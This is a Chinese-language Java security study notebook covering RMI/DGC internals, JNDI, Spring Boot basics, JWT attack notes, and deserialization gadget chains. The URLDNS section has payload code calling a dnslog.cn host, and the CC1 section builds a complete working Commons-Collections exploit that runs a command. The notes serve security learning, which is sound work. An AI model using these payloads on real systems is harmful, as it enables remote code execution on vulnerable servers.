    ![Snipaste_2025-04-04_18-45-27](JAVA安全/Snipaste_2025-04-04_18-45-27.png)

#### 服务端处理客户端请求

断点同样下在Target处，但这里又一个坑点，第一个Target的Stub是DGCImpl ，要的并不是这个，而是Proxy 动态代理的 Stub

![Snipaste_2025-04-04_17-25-57](JAVA安全/Snipaste_2025-04-04_17-25-57.png)

- 同样进入`dispatch()`方法下，因为`skel=null`，所以不会执行`oldDispatch ()`

  ![Snipaste_2025-04-04_17-26-37](JAVA安全/Snipaste_2025-04-04_17-26-37.png)

- 继续往下获取输入流以及远程对象的方法

  ![Snipaste_2025-04-04_17-27-45](JAVA安全/Snipaste_2025-04-04_17-27-45.png)

- 然后在下面的循环中通过`unmarshalValue()`，反序列化Client传过来的参数

  ![Snipaste_2025-04-04_17-31-49](JAVA安全/Snipaste_2025-04-04_17-31-49.png)

  ![Snipaste_2025-04-04_17-30-32](JAVA安全/Snipaste_2025-04-04_17-30-32.png)

- 继续往下就是Server调用方法获取结果

  ![Snipaste_2025-04-04_17-32-37](JAVA安全/Snipaste_2025-04-04_17-32-37-17437686299245.png)

  - 并且Server同样使用`marshaValue()`将结果序列化后返回给Client，Client同样使用`unmarshalValue()`反序列化获取结果

    ![Snipaste_2025-04-04_17-33-50](JAVA安全/Snipaste_2025-04-04_17-33-50.png)

#### DGC

前面提到过在创建注册中心时会创建三个对象封装到`ObjectTable`中，而`DGCImpl_Stub`在传入前就自动创建了，可以看到在put前就已经存在了

![Snipaste_2025-04-04_17-43-56](JAVA安全/Snipaste_2025-04-04_17-43-56.png)

那么DGC这个类是在哪儿创建的呢？又是怎么创建的呢？断点打在前面的if处

![Snipaste_2025-04-04_17-41-05](JAVA安全/Snipaste_2025-04-04_17-41-05.png)

- 这里调用了`DGCImpl`的*dgcLog*变量，而这个变量是一个静态变量

  ![Snipaste_2025-04-04_17-46-29](JAVA安全/Snipaste_2025-04-04_17-46-29.png)

  - 调取一个类的静态会完成这个类的初始化，而在类加载中我们知道了类的初始化会调用类的静态代码块，而这个类的静态代码块中有`run()`，该方法的下方的创建对象处就是完整的创建ref、将ref放入disp并创建stub动态代理的过程

    ![Snipaste_2025-04-04_17-47-03](JAVA安全/Snipaste_2025-04-04_17-47-03.png)

  - 可以跟进`createProxy()`，可以发现`DGCImpl_Stub`的创建和Registry创建Stub时一致

    ![Snipaste_2025-04-04_17-55-16](JAVA安全/Snipaste_2025-04-04_17-55-16.png)

    - 同样判断有无`DGCImpl_Stub`类，很明显JDK中自带了，此处就是将它实例化了

      ![Snipaste_2025-04-04_17-56-22](JAVA安全/Snipaste_2025-04-04_17-56-22.png)

  - 开启随机端口用于远程回收，并便放进Target中

    ![Snipaste_2025-04-04_17-57-46](JAVA安全/Snipaste_2025-04-04_17-57-46.png)

  - 之后的`setSkeleton()`和Registry中的过程一致，创建skel放入disp中

- 漏洞同样存在于Stub和Skel中，先看Stub中同样调用了`ref.invoke()`，造成JRMP攻击

  ![Snipaste_2025-04-04_17-59-47](JAVA安全/Snipaste_2025-04-04_17-59-47.png)

  - 然后是`dirty()`还有`readObject()`，这里的`clean()`和`dirty()`分别是强清除内存和弱清除内存

    ![Snipaste_2025-04-04_18-00-17](JAVA安全/Snipaste_2025-04-04_18-00-17.png)

- 然后看Skel中`dispatch()`中同样存在漏洞点

  ![Snipaste_2025-04-04_18-04-31](JAVA安全/Snipaste_2025-04-04_18-04-31.png)

##### 小结

自动创建的清除内存的过程，在Stub和Skel中都存在漏洞点，也就是JRMP攻击

### JNDI

`Java Naming and Directory Interface`，Java 命名和目录接口，一个名字对应一个Java对象，调用`JNDI`的`API`应用程序可以定位资源和其他程序对象。

支持以下四种服务

- LDAP：轻量级目录访问协议
- 通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务
- Java 远程方法调用(RMI) 注册表
- DNS 服务

JNDI接口主要为以下5个包

- [javax.naming](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html)
- [javax.naming.directory](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html)
- [javax.naming.event](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html)
- [javax.naming.ldap](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html)
- [javax.naming.spi](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html)

其中最重要的是 `javax.naming` 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。

JNDI调用不同服务时会调用`Context`这个类，如调用RMI服务则调用`RegistryContext`，一般先`new InitialContext()`，再调用 API 

## Java Web基础

### Servlet

## SpringBoot

Javaweb开发框架

- Spring
  - 轻量级Java开发框架，为解决企业级应用开发的复杂性而创建，简化开发
  - 关键策略
    - IOC
    - AOP
- 微服务
  - 架构风格
  - 把功能模块独立动态组合

### 自动配置

pom.xml

- 核心依赖在父工程中
- 有版本仓库

启动器

- Springboot的启动场景，如加载web启动器配置了web环境

主程序

```java
package com.example;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

//标识SpringBoot程序
@SpringBootApplication
public class SpringBootdemoApplication {

    public static void main(String[] args) {
        //启动SpringBoot
        SpringApplication.run(SpringBootdemoApplication.class, args);
    }

}
```

- 注解

  ![Snipaste_2025-04-15_14-31-52](JAVA安全/Snipaste_2025-04-15_14-31-52.png)

  - @ComponentScan：自动扫描并加载符合条件的组件或者bean，将bean定义加载到IOC容器中

  - @SpringBootConfiguration：标注SpringBoot配置类

    ```java
    @Configuration：SpringBoot配置类
    		@Component：启动应用的SpringBoot组件
    ```

  - @EnableAutoConfiguration：开启自动配置

    ```java
    @AutoConfigurationPackage：自动配置包
        	@Import({AutoConfigurationPackages.Registrar.class})
    	@Import({AutoConfigurationImportSelector.class})
    ```

  - `AutoConfigurationImportSelector`类：自动配置导入选择器

    ![Snipaste_2025-04-15_14-40-24](JAVA安全/Snipaste_2025-04-15_14-40-24.png)

    - 调用`SpringFactoriesLoader.loadFactoryNames`，以及`loadSpringFactories`

      ![Snipaste_2025-04-15_14-49-01](JAVA安全/Snipaste_2025-04-15_14-49-01.png)

    - 读取自动配置文件`spring.factories`

      ![Snipaste_2025-04-15_14-44-13](JAVA安全/Snipaste_2025-04-15_14-44-13.png)

      ![Snipaste_2025-04-15_14-57-40](JAVA安全/Snipaste_2025-04-15_14-57-40.png)

    - 也就是说在创建springboot项目时很多组件就已经自动配置了，那为什么还要在依赖中添加启动器呢，随便在`spring.factories`选择一个自动配置的类，如`AopAutoConfiguration`，可以看到有注解`@ConditionalOnClass`，也就是说虽然导入了，但是要配置生效需要通过启动器满足条件

      ![Snipaste_2025-04-15_15-00-55](JAVA安全/Snipaste_2025-04-15_15-00-55.png)

    - `@Conditional`，Spring的底层注解用来判断当前配置是否生效

  - 结论
    - SpringBoot在启动的时候会从`META-INF/spring.factories`获取`EnableAutoConfigurationd`的值
    - 这些值会作为自动配置类导入容器，通过反射得到class对象
    - 通过启动器使这些组件生效

- run()

  - 推断应用的类型是普通的项目还是Web项目
  - 推断并设置main方法的定义类，找到运行的主类

  ![1418974-20200309184347408-1065424525](JAVA安全/1418974-20200309184347408-1065424525.png)

### 配置文件

SpringBoot使用的全局配置文件，名称默认为`application.properties`，用于修改SpringBoot自动配置的默认值

#### ymal配置注入

全局的配置文件，**以数据作为中心，而不是以标记语言为重点**，结构类似python

- 键值对

  ```yaml
  Person:
  	name: Jw1ng
  	age: 21
  ```

- 数组

  ```yaml
  pets:
  	- cat
  	- dog
  	- pig
  	
  pets: [cat,dog,pig]
  ```

- 注入值

  - `@Component`：注册bean
  - `@ConfigurationProperties(prefix = "person")`：映射配置文件配置的属性值到组件中

  ![Snipaste_2025-04-15_16-44-02](JAVA安全/Snipaste_2025-04-15_16-44-02.png)

  ```yaml
  Person:
    name: Jw1ng
    age: 21
    happy: true
    birth: 04/2/16
    maps: {k1: v1, k2: v2}
    lists: [code, music, travel]
    dog: {name: 旺财, age: 3}
  ```

  - 配置文件占位符

    ```yaml
    Person:
      name: Jw1ng${random.uuid}
      age: ${random.int}
      happy: true
      birth: 04/2/16
      maps: {k1: v1, k2: v2}
      lists: [code, music, travel]
      dog:
        name: ${person.hello:other}_旺财
        age: 3
        
    #Person{name='Jw1ng12dc3a3c-7f6c-4b66-a628-1a19de8d334a', age=-985356247, happy=true, birth=Sat Apr 02 00:00:00 CST 2016, maps={k1=v1, k2=v2}, lists=[code, music, travel], dog=Dog{name='other_旺财', age=3}}
    
    ```

  - `@PropertySource`：加载非默认的指定配置文件

- 松散绑定

  - yaml中写`last-name`对应类中的`lastName`

#### JSR303数据校验

`@Validated`

```java
@NotNull(message="名字不能为空")
private String userName;
@Max(value=120,message="年龄最大不能查过120")
private int age;
@Email(message="邮箱格式错误")
private String email;

空检查
@Null       验证对象是否为null
@NotNull    验证对象是否不为null, 无法查检长度为0的字符串
@NotBlank   检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格.
@NotEmpty   检查约束元素是否为NULL或者是EMPTY.
    
Booelan检查
@AssertTrue     验证 Boolean 对象是否为 true  
@AssertFalse    验证 Boolean 对象是否为 false  
    
长度检查
@Size(min=, max=) 验证对象（Array,Collection,Map,String）长度是否在给定的范围之内  
@Length(min=, max=) string is between min and max included.

日期检查
@Past       验证 Date 和 Calendar 对象是否在当前时间之前  
@Future     验证 Date 和 Calendar 对象是否在当前时间之后  
@Pattern    验证 String 对象是否符合正则表达式的规则
```

#### 多环境配置

`application.properties`

```java
//application-test.properties 代表测试环境配置
//application-dev.properties 代表开发环境配置

spring.profiles.active=dev
```

`application.yml`

```yaml
server:
  port: 8081
#选择要激活那个环境块
spring:
  profiles:
    active: prod

---
server:
  port: 8083
spring:
  profiles: dev #配置环境的名称

---
server:
  port: 8084
spring:
  profiles: prod  #配置环境的名称
```

### Web程序

#### 路由

可在下看`WebMvcAutoConfiguration`类下看

```java
@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
    if (!this.resourceProperties.isAddMappings()) {
        logger.debug("Default resource handling disabled");
        return;
    }
    Duration cachePeriod = this.resourceProperties.getCache().getPeriod();
    CacheControl cacheControl = this.resourceProperties.getCache().getCachecontrol().toHttpCacheControl();
    //第一种路由
    if (!registry.hasMappingForPattern("/webjars/**")) {
        customizeResourceHandlerRegistration(registry.addResourceHandler("/webjars/**")
                                             .addResourceLocations("classpath:/META-INF/resources/webjars/")
                                             .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));
    }
    String staticPathPattern = this.mvcProperties.getStaticPathPattern();
    //第二种路由
    if (!registry.hasMappingForPattern(staticPathPattern)) {
        customizeResourceHandlerRegistration(registry.addResourceHandler(staticPathPattern)
                                             .addResourceLocations(getResourceLocations(this.resourceProperties.getStaticLocations()))
                                             .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));
    }
}
```

- 两种路由
  - webjars
  
    ![Snipaste_2025-04-16_12-51-59](JAVA安全/Snipaste_2025-04-16_12-51-59.png)
  
    - 例如：localhost:8080/webjars/jquery/3.4.1/jquery.js
  
  - resources/public；resources/static；resources/resources
    
    ![Snipaste_2025-04-16_12-57-42](JAVA安全/Snipaste_2025-04-16_12-57-42.png)
    
    - localhost:8080/1.js
    - 优先级
      - resources>static>public

#### 首页

![Snipaste_2025-04-16_13-10-50](JAVA安全/Snipaste_2025-04-16_13-10-50.png)

在resources下的静态目录放置index.html作为首页目录，路由为根目录

#### 模板引擎

Thymeleaf

![Snipaste_2025-04-16_13-41-27](JAVA安全/Snipaste_2025-04-16_13-41-27.png)

- 前缀后缀默认，只需将要渲染的html文件放在类路径的`templates`目录中即可，然后通过Controller跳转访问

  - 需要在html文件中导入命名空间的约束

    ```java
    <!DOCTYPE html>
    <html lang="en" xmlns:th="http://www.thymeleaf.org">
    <head>
        <meta charset="UTF-8">
        <title>首页</title>
    </head>
    <body>
    //修改指定值，输出文本
    <div th:text="${msg1}"></div>
    //输出未转义文本
    <div th:utext="${msg2}"></div>
    //遍历输出
    <div th:each="user:${users}" th:text="${user}"></div>
    </body>
    </html>
    ```

  - Controller

    ```java
    package com.example.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.web.bind.annotation.RequestMapping;
    import java.util.Arrays;
    
    @Controller
    public class IndexController {
        @RequestMapping("/index")
        public String index(Model model) {
            model.addAttribute("msg1", "<h1>Thymeleaf Test Page</h1>");
            model.addAttribute("msg2", "<h1>Thymeleaf</h1>");
            model.addAttribute("users", Arrays.asList("Jw1ng", "Dog"));
            return "index";
        }
    }
    
    ```

    ![Snipaste_2025-04-16_14-05-40](JAVA安全/Snipaste_2025-04-16_14-05-40.png)

### MVC自动配置原理

此处以`ViewResolver`的自动配置为例

在`WebMvcAutoConfiguration`类中找到`ContentNegotiatingViewResolver`类

![Snipaste_2025-04-16_15-16-46](JAVA安全/Snipaste_2025-04-16_15-16-46.png)

- 跟进这个类找到`resolveViewName`

  ![Snipaste_2025-04-16_15-17-09](JAVA安全/Snipaste_2025-04-16_15-17-09.png)

  - 循环遍历加载视图解析器

    ![Snipaste_2025-04-16_15-19-41](JAVA安全/Snipaste_2025-04-16_15-19-41.png)

- 尝试写一个视图解析器

  ![Snipaste_2025-04-16_15-33-25](JAVA安全/Snipaste_2025-04-16_15-33-25.png)

- 并打断点调试

  ![Snipaste_2025-04-16_15-31-58](JAVA安全/Snipaste_2025-04-16_15-31-58.png)

- 鉴于SpringBoot有MVC自动配置的功能，如果要定制化功能只需重写方法后添加进容器即可

- 另外要自定义MVC则不能加上`@EnableWebMvc`

  - 跟进该注解，发现导入了`DelegatingWebMvcConfiguration`类

    ![Snipaste_2025-04-16_18-35-57](JAVA安全/Snipaste_2025-04-16_18-35-57.png)

  - 继续跟进，发现该类继承了`WebMvcConfigurationSupport`

    ![Snipaste_2025-04-16_18-36-16](JAVA安全/Snipaste_2025-04-16_18-36-16.png)

  - 而自定义实现类`WebMvcAutoConfiguration` 的生效条件之一便是不能存在`WebMvcConfigurationSupport`类

    ![Snipaste_2025-04-16_18-35-31](JAVA安全/Snipaste_2025-04-16_18-35-31.png)


### 员工管理系统

#### 静态页面实现

将静态资源页面(html中的默认路径改为js或css等)通过**模板引擎渲染**

#### 国际化页面

在`resources`下配置`i18n`，分别配置不同语言的properties

![Snipaste_2025-04-17_11-11-44](JAVA安全/Snipaste_2025-04-17_11-11-44.png)

- 在`MessageSourceAutoConfiguration`类中导入i18n配置

  ![Snipaste_2025-04-17_10-25-29](JAVA安全/Snipaste_2025-04-17_10-25-29.png)

  ![Snipaste_2025-04-17_12-06-04](JAVA安全/Snipaste_2025-04-17_12-06-04.png)

在`WebMvcAutoConfiguration`类中有处理不同语言的分解器`LocalResolver`，所以要重写这个类

![Snipaste_2025-04-17_10-33-11](JAVA安全/Snipaste_2025-04-17_10-33-11.png)

- 重写`AcceptHeaderLocaleResolver`类中的`resolveLocale`方法

  ![Snipaste_2025-04-17_10-33-31](JAVA安全/Snipaste_2025-04-17_10-33-31.png)

- 创建`MyLocalResolver`重写方法

  ```java
  package com.example.config;
  
  import org.springframework.web.servlet.LocaleResolver;
  import org.thymeleaf.util.StringUtils;
  
  import javax.servlet.http.HttpServletRequest;
  import javax.servlet.http.HttpServletResponse;
  import java.util.Locale;
  
  public class MyLocalResolver implements LocaleResolver {
      @Override
      public Locale resolveLocale(HttpServletRequest request) {
          String language = request.getParameter("l");
          Locale locale = Locale.getDefault();
          if(!StringUtils.isEmpty(language)) {
              String[] split = language.split("_");
              locale  = new Locale(split[0], split[1]);
          }
          return locale;
      }
  
      @Override
      public void setLocale(HttpServletRequest request, HttpServletResponse response, Locale locale) {
  
      }
  }
  ```

  - 导入容器

    ![Snipaste_2025-04-17_12-04-21](JAVA安全/Snipaste_2025-04-17_12-04-21.png)

- 最后再配置一下模板即可，使用#{}

  ![Snipaste_2025-04-17_12-09-05](JAVA安全/Snipaste_2025-04-17_12-09-05.png)

#### 首页登录



#### 登录拦截器



## Java Web漏洞

### SQL注入

### XXE注入

-XMLReader

-SAXReader

-SAXBuilder

-Unmarshaller

-DocumentBuilder

/**

 \* 审计的函数

 \* 1. XMLReader

 \* 2. SAXReader

 \* 3. DocumentBuilder

 \* 4. XMLStreamReader

 \* 5. SAXBuilder

 \* 6. SAXParser

 \* 7. SAXSource

 \* 8. TransformerFactory

 \* 9. SAXTransformerFactory

 \* 10. SchemaFactory

 \* 11. Unmarshaller

 \* 12. XPathExpression

 */

### SSTI模板注入

### SPEL表达式

### JWT（身份认证）

#### 结构

由三段base64加密数据通过**.**连接构成token，第一段（header）包含加密算法和token类型，第二段包含数据（由加密算法+密匙共同加密），第三段是签名（包含**密匙**）

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```



#### 利用

##### 空加密攻击

**无密匙**，也就是没有第三段数据，前提是要**后端代码支持空加密算法**，比较鸡肋

##### 密匙爆破

##### KID攻击

在header头中可以添加kid数据，用于指定使用的加密算法的文件路径，可能造成任意文件读取、SQLl注入、RCE

## Java反序列化

### URLDNS

- 选择HashMap作为入口类，因其是JDK自带类，且重写了readObject()，继承了Serializable接口可进行反序列化，其中可传入参数K范围广，可以传入执行类

  ![Snipaste_2025-03-26_15-29-58](JAVA安全/Snipaste_2025-03-26_15-29-58.png)

- 从入口方法readObject开始跟链

  ![Snipaste_2025-03-26_15-27-53](JAVA安全/Snipaste_2025-03-26_15-27-53.png)

  一直往下发现`putVal()`中使用`hash()`将key值写入

  ![Snipaste_2025-03-26_15-28-10](JAVA安全/Snipaste_2025-03-26_15-28-10.png)

- 跟进hash方法发现在key值不为空时调用了`hashCode()`

  ![Snipaste_2025-03-26_15-28-26](JAVA安全/Snipaste_2025-03-26_15-28-26.png)

- 继续跟进`hashCode()`发现其是Object类下的int类型的无参方法

  ![Snipaste_2025-03-26_15-40-34](JAVA安全/Snipaste_2025-03-26_15-40-34.png)

- 接着是跟踪利用类URL，其下有与HashMap中同类型的`hashCode()`，当其为-1时便会执行`handler.hashCode()`

  ![Snipaste_2025-03-26_15-30-45](JAVA安全/Snipaste_2025-03-26_15-30-45.png)

- 跟踪该方法，进入类URLStreaHandler，发现其下有`getHostAddress()`

  ![Snipaste_2025-03-26_15-32-53](JAVA安全/Snipaste_2025-03-26_15-32-53.png)

- 继续深入跟踪该方法回到类URL，最后的利用方法为`InetAddress.getByname()`，也就是执行一次DNS查询

  ![Snipaste_2025-03-26_15-46-34](JAVA安全/Snipaste_2025-03-26_15-46-34.png)

- Gadget

  ```java
  HashMap.readObject()
    ->HashMap.putVal()
    	->HashMap.hash()
    		->URL.hashCode()
      		->URLStreaHandler.hashCode()
      		->URLStreaHandler.getHostAddress()
      			->URL.InetAddress.getByname()
      			
  最终的逻辑如下
  HashMap<URL, String>.hashCode() -> URL.hashCode()
  ```

- 利用代码

  ```java
  package URLDNS;
  
  
  import java.io.FileOutputStream;
  import java.io.IOException;
  import java.io.ObjectOutputStream;
  import java.lang.reflect.Field;
  import java.net.URL;
  import java.util.HashMap;
  
  public class SerializationTest {
  
      public static void main(String[] args) throws Exception {
          HashMap<URL, String> hashmap = new HashMap<URL, String>();
          URL url = new URL("http://kbkjap.dnslog.cn\n");
          Class aClass = url.getClass();
          Field hashCodefield = aClass.getDeclaredField("hashCode");
          hashCodefield.setAccessible(true);
          hashCodefield.set(url, 1);
          hashmap.put(url, "URLDNS");
          hashCodefield.set(url, -1);
          serialize(hashmap);
          
          
      }
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
          oos.writeObject(obj);
      }
  
  }
  
  ```
  
  - 这里之所以要利用反射修改hashCode的值是因为`put()`其下也有`hash()`，导致在序列化时就进行了一次DNS查询，会影响结果的判断
  
    ![Snipaste_2025-03-26_16-50-36](JAVA安全/Snipaste_2025-03-26_16-50-36.png)

### CC1

#### 改造命令执行方法

- 要通过Java反序列化执行命令首先就要序列化有可执行命令方法的类，这里选择Runtime.getRuntime()，通过以下命令便能在本地进行命令执行
  - 直接调用命令执行

```java
Runtime.getRuntime().exec("calc");
```

- 为了在反序列化时进行动态调用，选择更进一步通过反射调用
  - 反射调用命令执行

```java
Runtime r = Runtime.getRuntime();
Class runtimeClass = Runtime.class;
Method method = runtimeClass.getMethod("exec", String.class);
method.invoke(r, "calc");
```

- Runtime类本身是不能进行序列化的，但Runtime.class可以进行序列化

![Snipaste_2025-03-27_15-09-35](JAVA安全/Snipaste_2025-03-27_15-09-35.png)

- 这里选择通过反射获取`getRuntime()`获取Runtime类并调用`exec()`

```java
Class<Runtime> runtimeClass = Runtime.class;
Method method = runtimeClass.getMethod("getRuntime", null);
Runtime r = (Runtime) method.invoke(null, null);
Method exec = runtimeClass.getMethod("exec", String.class);
exec.invoke(r, "calc");
```

#### 由结果倒推CC1链

- CC1链的利用类主要是与继承`Transformer`接口几个类相关，其中用于执行命令的是`InvokerTransformer`类

  ![Snipaste_2025-03-27_12-19-35](JAVA安全/Snipaste_2025-03-27_12-19-35.png)

- 可以看到这个类是能序列化的，并且这个类的transformer方法能通过反射执行命令

  ![Snipaste_2025-03-27_12-14-19](JAVA安全/Snipaste_2025-03-27_12-14-19.png)

- 仿照改造命令执行方法的最终版，使用`InvokerTransformer.transform`调用

  ```java
  Method getmethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
  
  Runtime invoke = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getmethod);
  
  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invoke);
  ```

- 发现这个调用方法就是一条循环调用的链条，这里引出`Transformer`接口的另一个利用类`ChainedTransformer`，这个类的`transform()`巧好就是循环调用的方法

  ![Snipaste_2025-03-27_15-44-12](JAVA安全/Snipaste_2025-03-27_15-44-12.png)

- 所有进一步改造调用链执行命令的部分

  ```java
  Transformer[] transformers = new Transformer[] {
          new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
          new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
          new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
  };
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  chainedTransformer.transform(Runtime.class);
  ```

- Gadget的最后部分目前看起来没什么问题，接下来要做的就是找到可以衔接上`ChainedTransformer.transform()`的其它类，选择transform方法右键选择Find Usage

  ![Snipaste_2025-03-27_15-54-53](JAVA安全/Snipaste_2025-03-27_15-54-53.png)

- 最后选择的是Map内的类，可以看到有三个，这里先用类`TransformedMap`

  ![Snipaste_2025-03-28_10-57-58](JAVA安全/Snipaste_2025-03-28_10-57-58.png)

- 这里先选择`TransformedMap.checkSetValue()`

  ![Snipaste_2025-03-27_12-15-48](JAVA安全/Snipaste_2025-03-27_12-15-48.png)

  - 其中的`valueTransformer()`便是要传入的类，且value值可控，往上跟，发现这个类中使用装饰器装饰了Map，而要控制的`valueTransformer`赫然便在其中，所以可以创建一个Map对象并控制`valueTransformer`的值为`chainedTransformer`，也就是现在有了`chainedTransformer.transform()`

    ![Snipaste_2025-03-27_12-16-15](JAVA安全/Snipaste_2025-03-27_12-16-15.png)

  - 但我们的目标是`chainedTransformer.transform(Runtime.class)`，所以还要找到控制value值的类，并要能调用`checkSetValue()`，继续跟踪，到了`AbstractInputCheckedMapDecorator.setValue()`，其`MapEntry`类的`setValue()`控制了value的值，且调用了想要的方法

    ![Snipaste_2025-03-27_16-17-50](JAVA安全/Snipaste_2025-03-27_16-17-50.png)

  - `AbstractInputCheckedMapDecorator`恰好是`TransformedMap`的父类，通过`Map.Entry`接口调用MapEntry类，并调用其下的`setValue()`，代码片段如下

    ```java
    HashMap<Object, Object> map = new HashMap<>();
            map.put("key", "value");
            Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);
            for (Map.Entry entry:transformedmap.entrySet()) {
                entry.setValue(Runtime.class);
            }
    ```

- 接下来要处理的就是找到类触发`setValue()`，同样右键选择Find Usage，最后选择的是`AnnotationInvocationHandler.readObject()`，因为readObject()方法便是Java反序列的入口方法

  ![Snipaste_2025-03-27_12-18-29](JAVA安全/Snipaste_2025-03-27_12-18-29.png)

  - 接下来要做的就很简单了，也就是通过反射实例化类`AnnotationInvocationHandler`，并将其序列化

    ![Snipaste_2025-03-27_16-33-46](JAVA安全/Snipaste_2025-03-27_16-33-46.png)

  - 最后代码如下，其中传入的Class对象必须是Annotation也就是注解类型或其子类型

    ```java
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    declaredConstructor.setAccessible(true);
    Object o = declaredConstructor.newInstance(Override.class, transformedmap);
    
    serialize(o);
    deserialize("out.bin");
    ```

  - 最后代码虽然没有报错，但并没有成功执行从头到尾调试一下代码发现问题就出在了入口类

    - 首先是第一个问题，也就是第一个if处，判断成员变量类型是否为空

      ![Snipaste_2025-03-27_16-46-04](JAVA安全/Snipaste_2025-03-27_16-46-04.png)

    - 这里为空的原因是传入的Override注解其中本来就没有成员变量

      ![Snipaste_2025-03-27_16-49-41](JAVA安全/Snipaste_2025-03-27_16-49-41.png)

    - 所以这里选择传入Target，其中有value()成员变量

      ![Snipaste_2025-03-27_16-50-26](JAVA安全/Snipaste_2025-03-27_16-50-26.png)

    - 同时修改一下map的传入值，修改的代码片段如下

      ```java
      HashMap<Object, Object> map = new HashMap<>();
      map.put("value", "Jw1ng");
      /*省略的部分代码*/
      Object o = declaredConstructor.newInstance(Target.class, transformedmap);
      ```

    - 再次调试发现成功过了第一个if判断，第二个判断也没有拦截，但`setValue()`中的值并不可控，而是指定了`AnnotationTypeMismatchExceptionProxy`类，同样无法执行命令

      ![Snipaste_2025-03-27_16-57-43](JAVA安全/Snipaste_2025-03-27_16-57-43.png)

- 此处问题也引出了与`Transformer`相关的第三个类`ConstantTransformer`

  ![Snipaste_2025-03-27_17-02-21](JAVA安全/Snipaste_2025-03-27_17-02-21.png)

  - 其`transform()`始终返回传入的值也就相当于一个常量传入`Runtime.class`也就返回这个字节码，在`InvokerTransformer`前传入这个值，也就强过了在`readObject()`中的赋值

- 所以最终的代码如下

  ```java
  package CC1;
  
  import org.apache.commons.collections.Transformer;
  import org.apache.commons.collections.functors.ChainedTransformer;
  import org.apache.commons.collections.functors.ConstantTransformer;
  import org.apache.commons.collections.functors.InvokerTransformer;
  import org.apache.commons.collections.map.TransformedMap;
  
  import java.io.*;
  import java.lang.annotation.Target;
  import java.lang.reflect.Constructor;
  import java.lang.reflect.InvocationTargetException;
  import java.util.HashMap;
  import java.util.Map;
  
  public class CC1 {
      public static void main(String[] args) throws Exception {
  
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                  new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
          HashMap<Object, Object> map = new HashMap<>();
          map.put("value", "Jw1ng");
          Map<Object, Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);
         
          Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
          Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
          declaredConstructor.setAccessible(true);
          Object o = declaredConstructor.newInstance(Target.class, transformedmap);
  
          serialize(o);
          deserialize("out.bin");
  
      }
  
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
  
      }
  }
  
  ```

- Gadget如下

```java
AnnotationInvocationHandler.readObject()
	AbstractInputCheckedMapDecorator.setValue()
    	TransformedMap.checkSetValue()	
			ChainedTransformer.transform()
                ConstantTransformer(Runtime.class)
                InvokerTransformer.transform()
                    Class.getMethod
                    gerMethod.getRuntime()
                    Runtime.getRuntime().exec()
```

#### 另一种CC1利用链

- 链子的后半部分都相同，不同的是前半部分，这条链选择类`LazyMap`

  ![Snipaste_2025-03-28_10-57-58](JAVA安全/Snipaste_2025-03-28_10-57-58.png)

- 类`LazyMap`中的`get()`有可控类的`transform()`

  ![Snipaste_2025-03-28_11-02-28](JAVA安全/Snipaste_2025-03-28_11-02-28.png)

- 同样的装饰器，可以将`ChainedTransformer`作为factory传入

  ![Snipaste_2025-03-28_11-03-07](JAVA安全/Snipaste_2025-03-28_11-03-07.png)

  ```java
  /*
  省略下半部分代码
  */
  HashMap<Object, Object> map = new HashMap<>();
  Map lazymap = LazyMap.*decorate*(map, chainedTransformer);
  ```

- 接下来就是要找可控类触发`get()`，这里漏洞发现者同样选择类`AnnotationInvocationHandler`

  ![Snipaste_2025-03-28_11-05-58](JAVA安全/Snipaste_2025-03-28_11-05-58.png)

- `get()`在对象`invoke`中，这里要知道通过动态代理调用任何类似InvocationHandler的类的方法时都会触发`invoke()`，所以要想办法触发这个类中的方法，这里选择的还是`readObject()`中的方法

